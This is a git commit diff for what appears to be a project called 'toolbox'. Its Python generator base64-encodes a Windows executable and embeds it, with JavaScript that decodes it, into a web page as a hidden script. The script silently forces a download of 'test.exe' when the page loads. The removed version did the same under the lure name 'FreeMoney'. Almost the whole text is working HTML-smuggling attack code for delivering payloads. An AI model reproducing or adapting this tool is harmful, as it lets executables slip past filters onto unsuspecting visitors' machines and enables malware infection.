077a423de69199ca80a4a8d93504a75856d27f2b
strombach <fredde.stromback@gmail.com>
2024-11-01 15:24:44 +0100

    Refactor to take arguments for html and payload

--- Projekt/toolbox/app.js
+++
@@ -1,9 +0,0 @@
-
-function downloadFile() {
-    const aTag = document.createElement("a")
-    aTag.href = "./test.txt"
-    aTag.download = "FreeMoney.txt"
-    aTag.click()
-}
-
-window.onload(downloadFile())
--- Projekt/toolbox/html_gen.py
+++ Projekt/toolbox/html_gen.py
@@ -1,55 +1,56 @@
 import base64
 from bs4 import BeautifulSoup
 
-with open("./payload/Payload", "rb") as payload_file:
-    binary_data = payload_file.read()
-    encoded_data = base64.b64encode(binary_data).decode()
+def create_javascript(data, fileName):
+    js_script = f"""
+        function decodeData(data) {{
+            const decoded = window.atob(data)
+            const len = decoded.length
 
-js_script = f"""
+            var bytes = new Uint8Array( len );
+            for (var i = 0; i < len; i++) {{ bytes[i] = decoded.charCodeAt(i) }}
 
-    function decodeData(data) {{
-        const decoded = window.atob(data)
-        const len = decoded.length
+            return bytes.buffer;
+        }}
 
-        var bytes = new Uint8Array( len );
-        for (var i = 0; i < len; i++) {{ bytes[i] = decoded.charCodeAt(i) }}
+        const data = decodeData("{data}")
+        const fileName = "{fileName}"
 
-        return bytes.buffer;
-    }}
+        const blob = new Blob([data], {{type: 'octet/stream'}})
 
-    const data = decodeData("{encoded_data}")
-    const fileName = "FreeMoney"
+        if (window.navigator.msSaveOrOpenBlob) {{
+            window.navigator.msSaveOrOpenBlob(blob,fileName)
+        }} else {{
+            const a = document.createElement('a');
+            console.log(a);
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            const url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }}
+    """
+    return js_script
 
-    const blob = new Blob([data], {{type: 'octet/stream'}})
+def main(flags):
 
-    if (window.navigator.msSaveOrOpenBlob) {{
-        window.navigator.msSaveOrOpenBlob(blob,fileName)
-    }} else {{
-        const a = document.createElement('a');
-        console.log(a);
-        document.body.appendChild(a);
-        a.style = 'display: none';
-        const url = window.URL.createObjectURL(blob);
-        a.href = url;
-        a.download = fileName;
-        a.click();
-        window.URL.revokeObjectURL(url);
-    }}
-    console.log(data)
-"""
+    with open("./payload/WinPayload.exe", "rb") as payload_file:
+        binary_data = payload_file.read()
+        encoded_data = base64.b64encode(binary_data).decode()
 
-def main():
     with open("toolbox/index.html", "r", encoding="utf-8") as original_file:
         html_content = original_file.read()
 
     soup = BeautifulSoup(html_content, "html.parser")
 
     new_script = soup.new_tag("script")
-    new_script.string = js_script
+    new_script.string = create_javascript(encoded_data, "test.exe")
     soup.body.append(new_script)
 
     with open("modified_index.html", "w", encoding="utf-8") as new_file:
         new_file.write(str(soup.prettify()))
 
 if __name__ == "__main__":
-    main()
+    main("test")
